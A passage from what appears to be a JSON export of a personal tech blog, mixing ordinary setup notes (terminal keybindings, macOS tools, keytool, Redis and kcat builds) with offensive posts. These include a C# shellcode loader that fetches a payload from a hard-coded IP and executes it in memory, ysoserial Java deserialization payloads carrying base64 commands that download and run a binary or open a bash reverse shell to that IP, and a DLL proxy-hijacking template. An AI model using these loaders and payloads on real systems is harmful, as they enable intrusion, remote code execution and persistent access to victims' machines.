mods: Alt, chars: \u0026#34;\\x1bl\u0026#34; } - { key: M, mods: Alt, chars: \u0026#34;\\x1bm\u0026#34; } - { key: N, mods: Alt, chars: \u0026#34;\\x1bn\u0026#34; } - { key: O, mods: Alt, chars: \u0026#34;\\x1bo\u0026#34; } - { key: P, mods: Alt, chars: \u0026#34;\\x1bp\u0026#34; } - { key: Q, mods: Alt, chars: \u0026#34;\\x1bq\u0026#34; } - { key: R, mods: Alt, chars: \u0026#34;\\x1br\u0026#34; } - { key: S, mods: Alt, chars: \u0026#34;\\x1bs\u0026#34; } - { key: T, mods: Alt, chars: \u0026#34;\\x1bt\u0026#34; } - { key: U, mods: Alt, chars: \u0026#34;\\x1bu\u0026#34; } - { key: V, mods: Alt, chars: \u0026#34;\\x1bv\u0026#34; } - { key: W, mods: Alt, chars: \u0026#34;\\x1bw\u0026#34; } - { key: X, mods: Alt, chars: \u0026#34;\\x1bx\u0026#34; } - { key: Y, mods: Alt, chars: \u0026#34;\\x1by\u0026#34; } - { key: Z, mods: Alt, chars: \u0026#34;\\x1bz\u0026#34; } # curl -o ~/.config/alacritty/dracula.yml https://raw.githubusercontent.com/dracula/alacritty/master/dracula.yml import: - ~/.config/alacritty/dracula.yml ","permalink":"https://xhstormr.github.io/blog/posts/alacritty/","summary":"","title":"Alacritty"},{"content":"Updated on 2021-07-22\nHomebrew https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ https://brew.sh/ brew cleanup --prune=all -s brew update \u0026amp;\u0026amp; brew upgrade --greedy ❯ brew list -1 ==\u0026gt; Formulae aria2 coreutils gnu-sed hugo libssh2 nnn openssl@1.1 readline ==\u0026gt; Casks alfred amethyst cyberduck google-chrome iina intellij-idea karabiner-elements kitty maczip megasync miniconda mounty onyx rectangle snipaste sourcetree vlc xnviewmp Miniconda https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/ ❯ conda env export name: base channels: - conda-forge - defaults dependencies: - bat=0.18.2=h244e342_0 - brotlipy=0.7.0=py38h96a0964_1001 - bzip2=1.0.8=h0d85af4_4 - c-ares=1.17.1=h0d85af4_1 - ca-certificates=2021.5.30=h033912b_0 - certifi=2021.5.30=py38h50d1736_0 - cffi=1.14.6=py38h9688ba1_0 - chardet=4.0.0=py38h50d1736_1 - charset-normalizer=2.0.0=pyhd8ed1ab_0 - conda=4.10.3=py38h50d1736_0 - conda-package-handling=1.7.3=py38h96a0964_0 - cryptography=3.4.7=py38h1fa4640_0 - curl=7.77.0=hb861fe1_0 - exa=0.10.1=h244e342_0 - fd-find=8.2.1=h9bce647_0 - fish=3.3.1=h1ad05cb_0 - fzf=0.27.2=h990441c_0 - gettext=0.19.8.1=h7937167_1005 - idna=3.1=pyhd3deb0d_0 - jq=1.6=hc929b4f_1000 - krb5=1.19.1=hcfbf3a7_0 - libcurl=7.77.0=hf45b732_0 - libcxx=12.0.1=habf9029_0 - libedit=3.1.20191231=h0678c8f_2 - libev=4.33=haf1e3a3_1 - libevent=2.1.10=hddc9c9b_3 - libffi=3.3=h046ec9c_2 - libiconv=1.16=haf1e3a3_0 - libnghttp2=1.43.0=h07e645a_0 - libssh2=1.9.0=h52ee1ee_6 - lua=5.4.3=h29d0318_1 - ncurses=6.2=h2e338ed_4 - oniguruma=6.9.7.1=h0d85af4_0 - openssl=1.1.1k=h0d85af4_0 - pcre2=10.37=ha16e1b2_0 - pip=21.1.3=pyhd8ed1ab_0 - pycosat=0.6.3=py38h96a0964_1006 - pycparser=2.20=pyh9f0ad1d_2 - pycrypto=2.6.1=py38h94c058a_1005 - pycurl=7.43.0.6=py38h51ed575_1 - pyopenssl=20.0.1=pyhd8ed1ab_0 - pysocks=1.7.1=py38h50d1736_3 - python=3.8.10=h0e5c897_0_cpython - python.app=1.3=py38h96a0964_5 - python_abi=3.8=2_cp38 - readline=8.1=h05e3726_0 - requests=2.26.0=pyhd8ed1ab_0 - ripgrep=13.0.0=h244e342_0 - ruamel_yaml=0.15.80=py38h96a0964_1004 - setuptools=49.6.0=py38h50d1736_3 - six=1.16.0=pyh6c4a22f_0 - socat=1.7.3.4=h49596f2_1 - sqlite=3.36.0=h23a322b_0 - tk=8.6.10=h0419947_1 - tmux=3.1=h45fa02c_0 - tqdm=4.61.2=pyhd8ed1ab_1 - urllib3=1.26.6=pyhd8ed1ab_0 - vim=8.2.3215=py38hd4b178d_0 - wheel=0.36.2=pyhd3deb0d_0 - xz=5.2.5=haf1e3a3_1 - yaml=0.2.5=haf1e3a3_0 - youtube-dl=2021.6.6=py38h50d1736_0 - zlib=1.2.11=h7795811_1010 prefix: /usr/local/Caskroom/miniconda/base Karabiner https://karabiner-elements.pqrs.org/docs/json/ https://github.com/pqrs-org/Karabiner-Elements spacefn_plus.json windows_shortcuts_on_macos.json 快捷键兼容 frontmost_application_unless_rule.json { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_unless\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^org\\\\.alacritty$\u0026#34;, \u0026#34;^net\\\\.kovidgoyal\\\\.kitty$\u0026#34;, \u0026#34;^com\\\\.jetbrains\\\\.intellij$\u0026#34;, \u0026#34;^com\\\\.jetbrains\\\\.WebStorm$\u0026#34; ] } # 修改配置，排除某些应用。 jq --slurpfile input frontmost_application_unless_rule.json \u0026#39;.rules[].manipulators[].conditions += $input\u0026#39; 1.json \u0026gt; 2.json chrome_shortcuts.json { \u0026#34;title\u0026#34;: \u0026#34;chrome_shortcuts\u0026#34;, \u0026#34;rules\u0026#34;: [ { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+J\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_if\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.google\\\\.Chrome$\u0026#34; ] } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ], \u0026#34;optional\u0026#34;: [ \u0026#34;any\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34;, \u0026#34;left_alt\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] }, { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+H\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_if\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.google\\\\.Chrome$\u0026#34; ] } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ], \u0026#34;optional\u0026#34;: [ \u0026#34;any\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] }, { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+U\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_if\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.google\\\\.Chrome$\u0026#34; ] } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ], \u0026#34;optional\u0026#34;: [ \u0026#34;any\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34;, \u0026#34;left_option\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] }, { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+Click\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_if\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.google\\\\.Chrome$\u0026#34; ] } ], \u0026#34;from\u0026#34;: { \u0026#34;pointing_button\u0026#34;: \u0026#34;button1\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;pointing_button\u0026#34;: \u0026#34;button1\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] }, { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+Shift+I\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_if\u0026#34;, \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.google\\\\.Chrome$\u0026#34; ] } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34;, \u0026#34;left_shift\u0026#34; ], \u0026#34;optional\u0026#34;: [ \u0026#34;any\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34;, \u0026#34;left_alt\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] }, { \u0026#34;description\u0026#34;: \u0026#34;Ctrl+Right/left arrow\u0026#34;, \u0026#34;manipulators\u0026#34;: [ { \u0026#34;conditions\u0026#34;: [ { \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.microsoft\\\\.rdc$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.mac$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.macos$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.osx\\\\.beta$\u0026#34;, \u0026#34;^net\\\\.sf\\\\.cord$\u0026#34;, \u0026#34;^com\\\\.thinomenon\\\\.RemoteDesktopConnection$\u0026#34;, \u0026#34;^com\\\\.itap-mobile\\\\.qmote$\u0026#34;, \u0026#34;^com\\\\.nulana\\\\.remotixmac$\u0026#34;, \u0026#34;^com\\\\.p5sys\\\\.jump\\\\.mac\\\\.viewer$\u0026#34;, \u0026#34;^com\\\\.p5sys\\\\.jump\\\\.mac\\\\.viewer\\\\.web$\u0026#34;, \u0026#34;^com\\\\.teamviewer\\\\.TeamViewer$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.horizon$\u0026#34;, \u0026#34;^com\\\\.2X\\\\.Client\\\\.Mac$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.fusion$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.horizon$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.view$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.desktop$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.vm$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.desktop\\\\.console$\u0026#34;, \u0026#34;^org\\\\.virtualbox\\\\.app\\\\.VirtualBoxVM$\u0026#34;, \u0026#34;^com\\\\.citrix\\\\.XenAppViewer$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.proxyApp\\\\.\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.winapp\\\\.\u0026#34;, \u0026#34;^org\\\\.macports\\\\.X11$\u0026#34;, \u0026#34;^com\\\\.apple\\\\.Terminal$\u0026#34;, \u0026#34;^com\\\\.googlecode\\\\.iterm2$\u0026#34;, \u0026#34;^co\\\\.zeit\\\\.hyperterm$\u0026#34;, \u0026#34;^co\\\\.zeit\\\\.hyper$\u0026#34;, \u0026#34;^org\\\\.alacritty$\u0026#34;, \u0026#34;^net\\\\.kovidgoyal\\\\.kitty$\u0026#34; ], \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_unless\u0026#34; } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;left_arrow\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;left_arrow\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; }, { \u0026#34;conditions\u0026#34;: [ { \u0026#34;bundle_identifiers\u0026#34;: [ \u0026#34;^com\\\\.microsoft\\\\.rdc$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.mac$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.macos$\u0026#34;, \u0026#34;^com\\\\.microsoft\\\\.rdc\\\\.osx\\\\.beta$\u0026#34;, \u0026#34;^net\\\\.sf\\\\.cord$\u0026#34;, \u0026#34;^com\\\\.thinomenon\\\\.RemoteDesktopConnection$\u0026#34;, \u0026#34;^com\\\\.itap-mobile\\\\.qmote$\u0026#34;, \u0026#34;^com\\\\.nulana\\\\.remotixmac$\u0026#34;, \u0026#34;^com\\\\.p5sys\\\\.jump\\\\.mac\\\\.viewer$\u0026#34;, \u0026#34;^com\\\\.p5sys\\\\.jump\\\\.mac\\\\.viewer\\\\.web$\u0026#34;, \u0026#34;^com\\\\.teamviewer\\\\.TeamViewer$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.horizon$\u0026#34;, \u0026#34;^com\\\\.2X\\\\.Client\\\\.Mac$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.fusion$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.horizon$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.view$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.desktop$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.vm$\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.desktop\\\\.console$\u0026#34;, \u0026#34;^org\\\\.virtualbox\\\\.app\\\\.VirtualBoxVM$\u0026#34;, \u0026#34;^com\\\\.citrix\\\\.XenAppViewer$\u0026#34;, \u0026#34;^com\\\\.vmware\\\\.proxyApp\\\\.\u0026#34;, \u0026#34;^com\\\\.parallels\\\\.winapp\\\\.\u0026#34;, \u0026#34;^org\\\\.macports\\\\.X11$\u0026#34;, \u0026#34;^com\\\\.apple\\\\.Terminal$\u0026#34;, \u0026#34;^com\\\\.googlecode\\\\.iterm2$\u0026#34;, \u0026#34;^co\\\\.zeit\\\\.hyperterm$\u0026#34;, \u0026#34;^co\\\\.zeit\\\\.hyper$\u0026#34;, \u0026#34;^org\\\\.alacritty$\u0026#34;, \u0026#34;^net\\\\.kovidgoyal\\\\.kitty$\u0026#34; ], \u0026#34;type\u0026#34;: \u0026#34;frontmost_application_unless\u0026#34; } ], \u0026#34;from\u0026#34;: { \u0026#34;key_code\u0026#34;: \u0026#34;right_arrow\u0026#34;, \u0026#34;modifiers\u0026#34;: { \u0026#34;mandatory\u0026#34;: [ \u0026#34;left_control\u0026#34; ] } }, \u0026#34;to\u0026#34;: [ { \u0026#34;key_code\u0026#34;: \u0026#34;right_arrow\u0026#34;, \u0026#34;modifiers\u0026#34;: [ \u0026#34;left_command\u0026#34; ] } ], \u0026#34;type\u0026#34;: \u0026#34;basic\u0026#34; } ] } ] } IDEA https://plugins.jetbrains.com/plugin/13094-xwin-keymap/ ~/Library/'Application Support'/JetBrains/IntelliJIdea2021.1/ 快捷键兼容 https://courses.ics.hawaii.edu/ics314s21/morea/development-environments/reading-intellij-macos-configuration.html 7z https://www.7-zip.org/download.html curl https://www.7-zip.org/a/7z2103-mac.tar.xz | tar -x 7zz \u0026amp;\u0026amp; mv -f 7zz /usr/local/bin/ Font https://github.com/JetBrains/JetBrainsMono https://github.com/ryanoasis/nerd-fonts Misc networksetup -listallnetworkservices networksetup -setdnsservers Wi-Fi 1.2.4.8 8.8.8.8 9.9.9.9 networksetup -getdnsservers Wi-Fi cat /etc/resolv.conf sudo killall -HUP mDNSResponder ","permalink":"https://xhstormr.github.io/blog/posts/mac-os/","summary":"","title":"Mac OS"},{"content":"Updated on 2021-06-05\n简谱\t音名\t唱名 1\tC\tdo 2\tD\tre 3\tE\tmi 4\tF\tfa 5\tG\tsol 6\tA\tla 7\tB\tsi 大调音阶：两全一半三全一半\n","permalink":"https://xhstormr.github.io/blog/posts/music-theory/","summary":"","title":"乐理"},{"content":"Updated on 2021-03-14\nuuid.cs C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:winexe uuid.cs using System; using System.Collections.Generic; using System.IO; using System.Net; using System.Runtime.InteropServices; using System.Text; class Program { [DllImport(\u0026#34;rpcrt4\u0026#34;)] private static extern int UuidFromStringA(string uuid, IntPtr hpAddress); [DllImport(\u0026#34;kernel32\u0026#34;)] private static extern IntPtr HeapCreate(int flOptions, int dwInitialSize, int dwMaximumSize); [DllImport(\u0026#34;kernel32\u0026#34;)] private static extern IntPtr HeapAlloc(IntPtr hHeap, int dwFlags, int dwBytes); [DllImport(\u0026#34;kernel32\u0026#34;)] private static extern IntPtr EnumSystemLocalesA(IntPtr hAddress, int dwflags); private static void Main(string[] args) { WebRequest httpWebRequest = WebRequest.Create(\u0026#34;http://47.98.135.65:9527/uuid.txt\u0026#34;); httpWebRequest.Method = \u0026#34;GET\u0026#34;; WebResponse response = httpWebRequest.GetResponse(); Stream responseStream = response.GetResponseStream(); StreamReader streamReader = new StreamReader(responseStream, Encoding.Default); List\u0026lt;string\u0026gt; ids = new List\u0026lt;string\u0026gt;(); for (;;) { string text = streamReader.ReadLine(); if (text == null) break; ids.Add(text); } IntPtr hHeap = Program.HeapCreate(Program.HEAP_CREATE_ENABLE_EXECUTE, 0, 0); IntPtr intPtr = Program.HeapAlloc(hHeap, 0, 0x100000); IntPtr intPtr2 = intPtr; string[] array = ids.ToArray(); for (int i = 0; i \u0026lt; array.Length; i++) { int num2 = Program.UuidFromStringA(array[i], intPtr2); intPtr2 = (IntPtr)((int)intPtr2 + 16); } Program.EnumSystemLocalesA(intPtr, 0); } private static int HEAP_CREATE_ENABLE_EXECUTE = 262144; } uuid.kts D:\\Work\\kotlinc\\bin\\kotlinc -script uuid.kts import java.io.File import java.nio.ByteBuffer import java.nio.ByteOrder import java.util.* fun main() { val file = File(\u0026#34;payload.bin\u0026#34;) if (!file.exists()) return file.readBytes() .asList() .chunked(16) .map { it.toMutableList().apply { repeat(16 - this.size) { this += 0 } } } .map { it.toByteArray() } .map { toUUID(it) } .forEach { println(it) } } // https://stackoverflow.com/questions/5745512/how-to-read-a-net-guid-into-a-java-uuid fun toUUID(bytes: ByteArray): UUID { val source = ByteBuffer.wrap(bytes) val target = ByteBuffer.allocate(16) .order(ByteOrder.LITTLE_ENDIAN) .putInt(source.int) .putShort(source.short) .putShort(source.short) .order(ByteOrder.BIG_ENDIAN) .putLong(source.long) target.rewind() return UUID(target.long, target.long) } main() ","permalink":"https://xhstormr.github.io/blog/posts/shellcode-uuid/","summary":"","title":"Load shellcode from UUID"},{"content":"Updated on 2021-02-18\nNginx https://mirror.azure.cn/nginx/download/ nginx.conf location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi.conf; } PHP https://windows.php.net/downloads/releases/latest/ php.ini [PHP] extension=php_pdo_pgsql.dll extension=php_pgsql.dll extension_dir=\u0026#34;ext\u0026#34; php-cgi -b 127.0.0.1:9000 -c php.ini ","permalink":"https://xhstormr.github.io/blog/posts/php-with-nginx/","summary":"","title":"PHP with Nginx"},{"content":"Updated on 2021-01-27\n探测： java -jar ysoserial-master-SNAPSHOT.jar URLDNS \u0026#34;http://y8jhkk.dnslog.cn\u0026#34; \u0026gt; URLDNS.bin 利用： java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 \u0026#34;bash -c {echo,d2dldCAtcU8gMTdLNm9NQzUgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwOi8vNDcuOTguMTM1LjY1OjgwODAvbGpDUHh6dDsgY2htb2QgK3ggMTdLNm9NQzU7IC4vMTdLNm9NQzU=}|{base64,-d}|{bash,-i}\u0026#34; \u0026gt; CommonsBeanutils1.bin 转储为文本格式： java -jar SerializationDumper-v1.13.jar -r CommonsBeanutils1.bin \u0026gt; CommonsBeanutils1.txt 还原为二进制流： java -jar SerializationDumper-v1.13.jar -b CommonsBeanutils1.txt CommonsBeanutils1.ok.bin 计算 serialVersionUID -3490850999041592962 序列化后的值： busybox printf \u0026#34;%016x\u0026#34; -3490850999041592962 |^ busybox fold -w2 |^ busybox paste -sd\u0026#34; \u0026#34; ---- cf 8e 01 82 fe 4e f1 7e Shell 中执行命令： bash -c \u0026#39;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i}\u0026#39; Java 中执行命令： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i} Reference https://github.com/frohoff/ysoserial https://github.com/zema1/ysoserial https://github.com/NickstaDB/SerializationDumper http://jackson-t.ca/runtime-exec-payloads.html ","permalink":"https://xhstormr.github.io/blog/posts/java-deserialization-vul/","summary":"","title":"Java 反序列化漏洞利用"},{"content":"Updated on 2020-11-26\nAnBox https://docs.anbox.io/userguide/install.html https://github.com/geeks-r-us/anbox-playstore-installer Android-x86 https://mirrors.bfsu.edu.cn/osdn/android-x86/67834/android-x86_64-7.1-r4-k419.iso https://github.com/Rprop/libhoudini https://www.cnblogs.com/gao241/archive/2013/03/11/2953669.html 在 BIOS 界面选择 Debug 模式，之后： vi /mnt/grub/menu.lst ---- 在第一个 quiet 之后追加 nomodeset curl http://dl.android-x86.org/houdini/7_y/houdini.sfs -o /system/etc/houdini7_y.sfs curl http://dl.android-x86.org/houdini/7_z/houdini.sfs -o /system/etc/houdini7_z.sfs enable_nativebridge 之后到设置-\u0026gt;应用兼容性-\u0026gt;兼容模式-\u0026gt;启用 Alt-F1 = Console 模式 Alt-F7 = GUI 模式 adb connect 192.168.157.169 adb root Reference https://www.zhihu.com/question/48522805 ","permalink":"https://xhstormr.github.io/blog/posts/android-arm/","summary":"","title":"Android 模拟器启用 ARM 支持"},{"content":"Updated on 2020-10-13\nhttps://hub.docker.com/r/jboss/keycloak\nhttps://www.keycloak.org/documentation\nhttps://github.com/keycloak/keycloak\nhttps://github.com/keycloak/keycloak-documentation\n关闭强制 SSL 连接 /opt/jboss/keycloak/bin/kcadm.sh update realms/master -s sslRequired=NONE --server http://keycloak:8080/auth --realm master --user admin --password admin Reference Script Mapper Alternative https://github.com/spring-projects/spring-authorization-server ","permalink":"https://xhstormr.github.io/blog/posts/keycloak/","summary":"","title":"JBoss Keycloak"},{"content":"Updated on 2020-10-12\n生成密钥对： keytool -genkeypair -keystore release.p12 -storepass changeit -storetype pkcs12 -alias release -keyalg RSA -dname \u0026#34;cn=123\u0026#34; -ext \u0026#34;san=dns:*.example.com,ip:127.0.0.1\u0026#34; -validity 365 keytool -list -keystore release.p12 -storepass changeit -storetype pkcs12 导出证书： keytool -exportcert -keystore release.p12 -storepass changeit -alias release -file release.crt -rfc keytool -printcert -file release.crt 信任证书： keytool -importcert -cacerts -trustcacerts -storepass changeit -alias release -file release.crt -noprompt keytool -list -cacerts -storepass changeit 删除证书： keytool -delete -cacerts -trustcacerts -storepass changeit -alias release 转换密钥对格式： keytool -importkeystore ^ -srckeystore release.p12 -srcstoretype pkcs12 -srcstorepass changeit ^ -destkeystore release.jks -deststoretype jks -deststorepass changeit 导出证书： openssl pkcs12 -in release.p12 -password pass:changeit -out release.crt -nokeys 导出私钥： openssl pkcs12 -in release.p12 -password pass:changeit -out release.key -nocerts -nodes Reference https://docs.oracle.com/en/java/javase/15/docs/specs/man/keytool.html ","permalink":"https://xhstormr.github.io/blog/posts/java-keytool/","summary":"","title":"JDK Keytool"},{"content":"Updated on 2020-10-12\nhttps://github.com/apereo/cas\n折腾了 4 天，体会就是官方文档很坑爹，并且对 Docker 容器部署也不友好，弃坑。\nReference Configuration-Properties Configuration-Properties-Common ","permalink":"https://xhstormr.github.io/blog/posts/cas/","summary":"","title":"Apereo CAS"},{"content":"Updated on 2020-10-08\nhttps://github.com/redis/redis\nMSYS2\nRedis\nStep D:\\Work\\Download\\redis-unstable\u0026gt; pacman -Syu pacman -S --noconfirm --needed gcc make make CFLAGS=\u0026#39;-s -Os -D_GNU_SOURCE\u0026#39; LDFLAGS=\u0026#39;-static\u0026#39; Tool https://github.com/laixintao/iredis https://redislabs.com/redisinsight/ https://downloads.redisinsight.redislabs.com/latest/redisinsight-win.msi ","permalink":"https://xhstormr.github.io/blog/posts/msys2-build-redis/","summary":"","title":"构建 Redis"},{"content":"Updated on 2020-09-20\ncmake\nkafkacat\nlibrdkafka\nStep D:\\Work\\Download\\librdkafka-master\u0026gt; type nul \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD 11 CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt; PreLoad.cmake echo set(CMAKE_C_STANDARD_REQUIRED ON CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_C_FLAGS \u0026#34;-s -Os\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_CXX_FLAGS \u0026#34;-s -Os\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_EXE_LINKER_FLAGS \u0026#34;-static\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo. \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_GENERATOR \u0026#34;MinGW Makefiles\u0026#34; CACHE INTERNAL \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake echo set(CMAKE_INSTALL_PREFIX \u0026#34;456\u0026#34; CACHE PATH \u0026#34;\u0026#34; FORCE) \u0026gt;\u0026gt; PreLoad.cmake md 123 \u0026amp;\u0026amp; cd 123 \u0026amp;\u0026amp; cmake .. -DWITH_SSL=OFF -DWITH_ZLIB=OFF -DRDKAFKA_BUILD_STATIC=ON \u0026amp;\u0026amp; mingw32-make \u0026amp;\u0026amp; mingw32-make install D:\\Work\\Download\\kafkacat-master\u0026gt; pacman -S mingw-w64-x86_64-yajl fd -t f -X busybox sed -i \u0026#34;s/_MSC_VER/_MY123/g\u0026#34; gcc -s -Os -static kafkacat.c format.c tools.c json.c win32\\getdelim.c -ID:\\Download\\librdkafka-master\\123\\456\\include -LD:\\Download\\librdkafka-master\\123\\456\\lib -lrdkafka -lws2_32 -lsecur32 -lzstd -lyajl_s -DLIBRDKAFKA_STATICLIB -D_MY123 -DENABLE_JSON ","permalink":"https://xhstormr.github.io/blog/posts/cmake-build-kcat/","summary":"","title":"构建 kcat"},{"content":"Updated on 2020-09-15\nhttps://kafka.apache.org/\nhttps://github.com/apache/kafka\nhttps://www.confluent.io/download\nhttps://hub.docker.com/r/confluentinc/cp-kafka\nReference https://docs.confluent.io/current/connect/transforms/index.html https://docs.confluent.io/current/connect/references/restapi.html https://docs.confluent.io/current/connect/managing/connectors.html GUI: https://www.kafkatool.com/ https://github.com/provectus/kafka-ui ","permalink":"https://xhstormr.github.io/blog/posts/kafka/","summary":"","title":"Kafka"},{"content":"Updated on 2020-09-07\nFile proxy.c #include \u0026lt;windows.h\u0026gt; BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) { switch (reason) { case DLL_PROCESS_ATTACH: WinExec(\u0026#34;calc.exe\u0026#34;, SW_HIDE); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } proxy.def EXPORTS NSLICENSE_DateToMagicCode = nslicense_old.NSLICENSE_DateToMagicCode Command i686-w64-mingw32-gcc proxy.c -c -o proxy.o dlltool proxy.o -e proxy.exp -z proxy.def -l proxy.lib --export-all-symbols i686-w64-mingw32-gcc proxy.o proxy.def -shared -o proxy.dll i686-w64-mingw32-gcc proxy.c -c -o proxy.o gnatdll proxy.o -e proxy.def -d proxy.dll i686-w64-mingw32-gcc proxy.c proxy.def -o proxy.dll -shared -s gendef - nslicense.dll \u0026gt; 123.txt awk \u0026#39;NR==1 {print \u0026#34;EXPORTS\u0026#34; \u0026gt; \u0026#34;proxy.def\u0026#34;} {print $1 \u0026#34; = nslicense_old.\u0026#34; $1 \u0026gt; 